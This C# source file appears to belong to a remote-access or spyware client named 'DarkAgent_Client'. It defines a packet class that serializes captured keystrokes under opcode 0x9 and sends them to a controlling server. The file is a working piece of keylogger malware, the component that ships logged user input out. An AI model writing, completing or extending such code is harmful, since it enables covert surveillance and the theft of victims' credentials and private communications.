using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Send
{
    class S_KeyStrokes : SendBasePacket
    {
        string KeyStrokes;
        public S_KeyStrokes(ClientConnect client, string KeyStrokes)
            : base(client)
        {
            this.KeyStrokes = KeyStrokes;
        }

        protected internal override void Write()
        {
            WriteByte(0x9);
            WriteString(KeyStrokes);
        }
    }
}